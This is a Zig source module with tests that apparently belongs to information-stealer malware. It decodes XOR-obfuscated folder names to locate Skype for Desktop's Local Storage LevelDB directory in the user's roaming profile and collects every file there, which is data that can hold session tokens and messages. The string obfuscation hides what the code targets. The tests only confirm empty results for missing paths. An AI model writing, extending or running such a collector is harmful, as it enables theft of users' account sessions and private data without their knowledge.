const std = @import("std");
const hash = @import("../types/hash.zig");

const E = struct {
    const MICROSOFT = hash.xorEncrypt("Microsoft");
    const SKYPE = hash.xorEncrypt("Skype for Desktop");
    const LOCAL_STORAGE = hash.xorEncrypt("Local Storage");
    const LEVELDB = hash.xorEncrypt("leveldb");
};

pub fn collect(allocator: std.mem.Allocator, roaming: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }

    var ms_buf: [E.MICROSOFT.len]u8 = undefined;
    var skype_buf: [E.SKYPE.len]u8 = undefined;
    var ls_buf: [E.LOCAL_STORAGE.len]u8 = undefined;
    var ldb_buf: [E.LEVELDB.len]u8 = undefined;
    hash.xorDecrypt(&E.MICROSOFT, &ms_buf);
    hash.xorDecrypt(&E.SKYPE, &skype_buf);
    hash.xorDecrypt(&E.LOCAL_STORAGE, &ls_buf);
    hash.xorDecrypt(&E.LEVELDB, &ldb_buf);

    const base_path = std.fs.path.join(allocator, &[_][]const u8{ roaming, ms_buf[0..], skype_buf[0..] }) catch return try allocator.alloc([]const u8, 0);
    defer allocator.free(base_path);

    const leveldb_path = std.fs.path.join(allocator, &[_][]const u8{ base_path, ls_buf[0..], ldb_buf[0..] }) catch return try allocator.alloc([]const u8, 0);
    defer allocator.free(leveldb_path);

    var dir = std.fs.openDirAbsolute(leveldb_path, .{ .iterate = true }) catch return try allocator.alloc([]const u8, 0);
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .file) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ leveldb_path, entry.name });
        try files.append(full);
    }

    return files.toOwnedSlice();
}

test "collect returns empty for nonexistent path" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__skype");
    defer {
        for (result) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "collect returns empty for missing leveldb" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__skype_nodb");
    defer {
        for (result) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}
